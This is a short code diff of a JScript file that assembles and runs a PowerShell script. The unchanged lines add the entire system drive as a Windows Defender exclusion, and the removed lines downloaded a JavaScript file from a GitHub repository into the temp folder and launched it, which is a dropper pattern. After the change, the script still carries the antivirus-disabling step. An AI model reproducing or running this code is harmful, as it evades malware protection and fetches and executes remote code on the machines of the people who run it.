@@ -19,16 +19,7 @@ var psContent =
 '    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
 '} catch {\n' +
 '    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
-'}\n' +
-'\n' +
-'Write-Output "Current settings (Get-MpPreference):";\n' +
-'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
-'\n' +
-'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2drop.js";\n' +
-'$destination = "$env:TEMP\\main.js";\n' +
-'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
-'Start-Process $destination;\n' +
-'Write-Output "";\n';
+'}\n';
 
 // Write the PS script to temp
 try {
@@ -73,6 +64,7 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
 
 
